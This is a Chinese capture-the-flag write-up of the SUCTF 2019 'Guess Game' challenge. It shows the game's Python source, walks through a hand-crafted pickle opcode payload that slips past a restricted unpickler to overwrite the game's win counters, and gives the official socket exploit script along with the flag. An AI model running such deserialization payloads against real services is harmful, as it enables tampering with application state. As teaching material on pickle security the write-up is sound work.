# [SUCTF 2019]Guess Game

[题目地址](https://buuoj.cn/challenges#[SUCTF%202019]Guess%20Game)

是不是有个奇怪的题混进了misc？

题目给了源码，立刻觉得不对劲，啥misc会有源码？去看了下还不少，先看__init__.py。


```python
#__init__.py
banner = r'''
  ____                        ____                      
 / ___|_   _  ___  ___ ___   / ___| __ _ _ __ ___   ___ 
| |  _| | | |/ _ \/ __/ __| | |  _ / _` | '_ ` _ \ / _ \
| |_| | |_| |  __/\__ \__ \ | |_| | (_| | | | | | |  __/
 \____|\__,_|\___||___/___/  \____|\__,_|_| |_| |_|\___|


Rule:
    Guess my number!
    If you are right in every round,
    then I will give you flag.
'''

max_round = 10
number_range = 10

from guess_game.Game import Game

game = Game()
```

定义了一些变量，没啥看的。

```python
#game_server.py
from guess_game.Ticket import Ticket
from guess_game.RestrictedUnpickler import restricted_loads
from struct import unpack
from guess_game import game
import sys


def get_flag():
    with open('/flag', 'r') as f:
        flag = f.read().strip()
    return flag


def read_length(obj):
    return unpack('>I', obj)


def stdin_read(length):
    return sys.stdin.buffer.read(length)


try:
    while not game.finished():
        length = stdin_read(4)
        length, = read_length(length)

        ticket = stdin_read(length)
        ticket = restricted_loads(ticket)

        assert type(ticket) == Ticket

        if not ticket.is_valid():
            print('The number is invalid.')
            game.next_game(Ticket(-1))
            continue

        win = game.next_game(ticket)
        if win:
            text = "Congratulations, you get the right number!"
        else:
            text = "Wrong number, better luck next time."
        print(text)

    if game.is_win():
        text = "Game over! You win all the rounds, here is your flag %s" % get_flag()
    else:
        text = "Game over! You got %d/%d." % (game.win_count, game.round_count)
    print(text)

except Exception:
    print('Houston, we got a problem.')
```

这里只是调用，关键判断逻辑都不在这里面。按顺序看，先看restricted_loads是个什么玩意。

```python
#RestrictedUnpickler.py
import io
import pickle
import sys


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        #要求必须是guess_game模块下的game，且name里不带"__"（带了通常都是不安全的rce调用）
        if "guess_game" == module[0:10] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

RestrictedUnpickler继承自[pickle.Unpickler](https://docs.python.org/3/library/pickle.html#pickle.Unpickler)，重写了其中的find_class方法。[getattr](https://www.runoob.com/python/python-func-getattr.html)函数获取[sys.modules](https://www.cnblogs.com/zhaojingyu/p/9069076.html)（一个全局字典，记录导入的模块）的module模块的name属性值。这个name属性值应该也是个pickle.Unpickler对象，查官方文档似乎没看见有第二个类有这个方法。

```python
#Game.py
from random import randint
from guess_game.Ticket import Ticket
from guess_game import max_round, number_range


class Game:
    def __init__(self):
        number = randint(0, number_range)
        self.curr_ticket = Ticket(number)
        self.round_count = 0
        self.win_count = 0

    def next_game(self, ticket):
        win = False
        if self.curr_ticket == ticket:
            self.win_count += 1
            win = True

        number = randint(0, number_range)
        self.curr_ticket = Ticket(number)
        self.round_count += 1

        return win

    def finished(self):
        return self.round_count >= max_round

    def is_win(self):
        return self.win_count == max_round
```

Game.py就是判断赢没赢，游戏是否结束等逻辑。正常靠猜几乎不可能赢，不过刚才有个pickle反序列化，能否利用一下？来看看[wp](https://zhuanlan.zhihu.com/p/90798308)中手写的optcode干了什么。

```
cguess_game
game
}S"win_count"
I10
sS"round_count"
I9
sb
```

翻译一下：

```
c：引入模块和对象，模块名和对象名以换行符分割。（find_class校验就在这一步，要求我们只能引入guess_game模块。要是c这个OPCODE的参数没有被find_class限制，其他地方获取的对象就不会被沙盒影响）
}：push一个空的字典，相当于push {}
S: push一个字符串
I: push一个整型
s: 按照wp的理解以及一些参考文章，pop两位 ，然后作为字典的key和value，这个跟pyc的代码是类似的。
b: 调用__setstate__ 或者 __dict__.update()
```

所以整体的意思是：

```
cguess_game 
game                   向栈压入guess_game.game
}                      压入空字典
S"win_count"           压入字符串"win_count"    
I10                    压入数字10
s                      设置字典键值对{"win_count":10}
S"round_count"         压入字符串"round_count"
I9                     压入数字9
s                      设置字典键值对{"round_count":9}
b                      调用guess_game.game.__dict__.update({"win_count":10,"round_count":9})
```

把guess_game.game的win_count和round_count改为符合获胜条件的值。至于为什么要手写，因为如果直接写from guess_game import game, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取。这样还不够，下面的代码：

```python
ticket = restricted_loads(ticket)
assert type(ticket) == Ticket
```

要求栈顶为一个 Ticket。这比较简单, 可以直接dumps 一个 Ticket 然后拼到之前手写的内容后面就可以了。官方wp：

```python
import pickle
import socket
import struct

s = socket.socket()
s.connect(('47.111.59.243', 8051))

exp = b'''cguess_game
game
}S"win_count"
I10
sS"round_count"
I9
sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.'''

s.send(struct.pack('>I', len(exp)))
s.send(exp)

print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
```

## Flag
> flag{36cc8cc6-f139-44ee-8d39-9cbfb95317b6}